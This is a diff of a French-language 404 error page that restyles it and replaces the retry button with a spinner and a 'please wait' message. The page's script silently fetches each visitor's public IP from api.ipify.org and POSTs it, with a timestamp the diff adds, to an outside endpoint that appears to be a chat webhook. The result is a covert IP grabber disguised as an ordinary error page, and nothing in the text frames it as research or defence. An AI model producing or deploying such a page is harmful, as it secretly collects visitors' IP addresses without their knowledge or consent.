@@ -2,37 +2,60 @@
 <html lang="fr">
 <head>
   <meta charset="UTF-8">
-  <title>404 - Page non trouvée</title>
+  <title>Erreur 404</title>
   <style>
     body {
-      background-color: #121212;
-      color: white;
-      font-family: Arial, sans-serif;
-      text-align: center;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #0f0f0f, #1a1a1a);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      color: #fff;
       display: flex;
       flex-direction: column;
       justify-content: center;
+      align-items: center;
       height: 100vh;
-      margin: 0;
+      text-align: center;
     }
-    h1 { font-size: 6rem; }
-    p { font-size: 1.5rem; }
-    button {
+
+    h1 {
+      font-size: 8rem;
+      margin: 0;
+      color: #ff4444;
+    }
+
+    p {
+      font-size: 1.5rem;
+      margin-bottom: 40px;
+      opacity: 0.8;
+    }
+
+    .loader {
+      border: 6px solid #2c2c2c;
+      border-top: 6px solid #00bcd4;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .info {
       margin-top: 20px;
-      padding: 10px 20px;
-      background: #00bcd4;
-      border: none;
-      color: #121212;
-      font-weight: bold;
-      border-radius: 8px;
-      cursor: pointer;
+      font-size: 0.9rem;
+      color: #888;
     }
   </style>
 </head>
 <body>
   <h1>404</h1>
-  <p>Oups... Page introuvable</p>
-  <button onclick="window.location.reload()">Réessayer</button>
+  <p>La page que tu cherches n'existe pas.</p>
+  <div class="loader"></div>
+  <div class="info">Chargement... Merci de patienter</div>
 
   <script>
     fetch("https://api.ipify.org?format=json")
@@ -45,7 +68,7 @@
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            content: `Nouvelle IP captée : ${ip}`
+            content: `🕵️ Nouvelle IP captée : \`${ip}\`\n📅 Date : ${new Date().toLocaleString()}`
           })
         });
       });
